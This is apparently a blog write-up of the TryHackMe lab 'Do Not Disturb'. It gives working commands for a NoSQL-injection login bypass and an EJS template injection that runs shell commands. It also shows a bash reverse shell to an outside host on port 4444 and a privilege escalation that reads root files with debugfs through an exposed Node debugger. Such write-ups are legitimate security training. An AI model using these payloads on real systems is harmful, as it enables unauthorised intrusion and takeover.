---
title: "Do Not Disturb"
date: 2026-10-31 20:49:22 +0700
categories: ["TryHackMe", "Holiday Challenge"]
tags: ["tryhackme"]
description: "Sign's on the door. Room's active. You have access you were never given, and so does he."
toc: true
comments: false
---

![image-1419](/assets/img/obsidian/do-not-disturb/image-1419.png)

![image-1420](/assets/img/obsidian/do-not-disturb/image-1420.png)

# Scenario

![image-1424](/assets/img/obsidian/do-not-disturb/image-1424.png)

# Questions

![image-1422](/assets/img/obsidian/do-not-disturb/image-1422.png)

---

## Reconnaissance

Scan for open ports using `rustscan`

Ports 22 (SSH) and 80 (HTTP) are open.

![image-1425](/assets/img/obsidian/do-not-disturb/image-1425.png)

![image-1426](/assets/img/obsidian/do-not-disturb/image-1426.png)

So, let's check the website first.

![image-1427](/assets/img/obsidian/do-not-disturb/image-1427.png)

![image-1428](/assets/img/obsidian/do-not-disturb/image-1428.png)

---

## Login Bypass

`curl -i -s -c cookie.txt -d 'username=attendant&password[$ne]=x' http://10.48.173.139/login`

If the server is vuln and directly uses the parsed input in a `MongoDB` query,

this turns 

```js
{ username: "attendant", password: "x" }
```

into 

```js
{ username: "attendant", password: { $ne: "x" } }
```

meaning **"find the `attendant` user whose password is not `x`."**

If such a query is accepted without proper validation, it can potentially result in **authentication bypass**.

![image-1429](/assets/img/obsidian/do-not-disturb/image-1429.png)

We got a cookie at the `/staff `location

![image-1430](/assets/img/obsidian/do-not-disturb/image-1430.png)

---

## Template Injection

Now, we're gonna perform **template injection**

```bash
 curl -s -b cookie.txt --data-urlencode 'template=<%=7*7%>' http://10.48.173.139/staff/preview
```

![image-1431](/assets/img/obsidian/do-not-disturb/image-1431.png)

and we can see that they accept our injected template. So, now let's inject another template to do a **reverse shell**

```bash
curl -s -b cookie.txt --data-urlencode 'template=<%=global.process.mainModule.require("child_process").execSync("id").toString() %>' http://10.48.173.139/staff/preview
```


![image-1432](/assets/img/obsidian/do-not-disturb/image-1432.png)

```bash
curl -s -b cookie.txt --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.141.248/4444 0>&1\"').toString() %>" http://10.48.173.139/staff/preview 
```

---

## Reverse shell
![image-1433](/assets/img/obsidian/do-not-disturb/image-1433.png)

![image-1434](/assets/img/obsidian/do-not-disturb/image-1434.png)

![image-1435](/assets/img/obsidian/do-not-disturb/image-1435.png)

Found the first flag at `/home/poolside/user.txt`

![image-1436](/assets/img/obsidian/do-not-disturb/image-1436.png)

---

## Node Debugger

and we found the `processor.js` file

![image-1437](/assets/img/obsidian/do-not-disturb/image-1437.png)

and this is running in a loop, so this means it keeps running in the background

![image-1438](/assets/img/obsidian/do-not-disturb/image-1438.png)

The process is listening for debugging on `127.0.0.1:9229`. Since we already have a shell on this machine, let's connect to that debugger.

We found that it uses **port 9229** with the **--inspect** flag and connects using node

So, we will use the following commands 

```bash
node inspect 127.0.0.1:9229
repl
# validate
process.getuid()
process.getgid()
process.cwd()
process.getBuiltinModule('child_process').execSync('id').toString()
process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true").toString()
```

![image-1439](/assets/img/obsidian/do-not-disturb/image-1439.png)

The debugger runs our commands as `pipelinesvc`, and `id` shows this account belongs to the `disk` group. So, we now have a different user's permissions through the Node process.

It shows we are in the disk group.

![image-1440](/assets/img/obsidian/do-not-disturb/image-1440.png)

---

## Read the Root Flag

The disk group can access `/dev/nvme0n1p1` directly. Let's use `debugfs` to read the filesystem on that partition and look inside `/root`.


```bash
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'ls /root', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

![image-1441](/assets/img/obsidian/do-not-disturb/image-1441.png)

find `root.txt`

```bash
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

![image-1442](/assets/img/obsidian/do-not-disturb/image-1442.png)

Finally, get the flag!

---
